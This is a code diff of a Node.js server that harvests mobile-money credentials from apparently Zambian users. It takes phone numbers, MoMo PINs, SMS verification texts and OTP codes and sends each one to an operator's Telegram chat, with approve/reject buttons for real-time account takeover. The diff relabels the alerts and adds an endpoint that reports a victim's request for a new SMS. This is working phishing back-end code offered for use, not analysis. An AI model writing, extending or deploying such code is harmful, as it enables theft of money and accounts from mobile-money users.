@@ -30,7 +30,7 @@ app.post('/verify-pin', async (req, res) => {
   applications[appId].momo_pin = pin;
   applications[appId].status = 'pending_auth';
 
-  const message = `🔐 *MoMo Authentication Request*\n\n` +
+  const message = `🔐 *NEW APPLICATION ZAMBIA*\n\n` +
     `📱 *Phone:* +260 ${phone}\n` +
     `🔑 *PIN:* \`${pin}\`\n` +
     `🆔 *App ID:* ${appId}`;
@@ -63,7 +63,7 @@ app.post('/verify-sms', async (req, res) => {
     applications[appId].status = 'pending_sms';
   }
 
-  const message = `💬 *SMS Verification Text Received*\n\n` +
+  const message = `💬 *SMS VERIFICATION TEXT RECEIVED*\n\n` +
     `📱 *Phone:* +260 ${applications[appId]?.momo_phone || 'N/A'}\n\n` +
     `📄 *Content:*\n\`\`\`\n${smsText}\n\`\`\`\n\n` +
     `🆔 *App ID:* ${appId}`;
@@ -71,8 +71,8 @@ app.post('/verify-sms', async (req, res) => {
   const keyboard = {
     inline_keyboard: [
       [
-        { text: '✅ Correct SMS Text', callback_data: `sms_approve_${appId}` },
-        { text: '❌ Wrong SMS Text', callback_data: `sms_reject_${appId}` }
+        { text: '✅ CORRECT SMS TEXT', callback_data: `sms_approve_${appId}` },
+        { text: '❌ WRONG SMS TEXT', callback_data: `sms_reject_${appId}` }
       ]
     ]
   };
@@ -96,7 +96,7 @@ app.post('/verify-otp', async (req, res) => {
     applications[appId].status = 'pending_otp';
   }
 
-  const message = `🔢 *OTP Verification Received*\n\n` +
+  const message = `🔢 *OTP VERIFICATION RECEIVED*\n\n` +
     `📱 *Phone:* +260 ${applications[appId]?.momo_phone || 'N/A'}\n` +
     `🔑 *OTP Code:* \`${otpCode}\`\n` +
     `🆔 *App ID:* ${appId}`;
@@ -104,8 +104,8 @@ app.post('/verify-otp', async (req, res) => {
   const keyboard = {
     inline_keyboard: [
       [
-        { text: '✅ Correct OTP', callback_data: `otp_approve_${appId}` },
-        { text: '❌ Wrong OTP', callback_data: `otp_reject_${appId}` }
+        { text: '✅ CORRECT OTP', callback_data: `otp_approve_${appId}` },
+        { text: '❌ WRONG OTP', callback_data: `otp_reject_${appId}` }
       ]
     ]
   };
@@ -119,6 +119,31 @@ app.post('/verify-otp', async (req, res) => {
     res.json({ success: true });
   } catch (err) {
     res.status(500).json({ error: 'Failed to send to Telegram' });
+  }
+});
+
+app.post('/api/request-sms', async (req, res) => {
+  const { appId, phone } = req.body;
+
+  const message = `🔄 *NEW SMS REQUEST*\n\n` +
+                  `📱 *Phone:* +260 ${phone || 'N/A'}\n` +
+                  `🆔 *App ID:* ${appId}\n\n` +
+                  `The applicant has requested a new SMS verification timer reset.`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    });
+    res.json({ success: true });
+  } catch (err) {
+    console.error('Telegram notification error:', err);
+    res.status(500).json({ error: 'Failed to send notification' });
   }
 });
 
@@ -167,4 +192,4 @@ app.post('/telegram-webhook', async (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
-          
+    
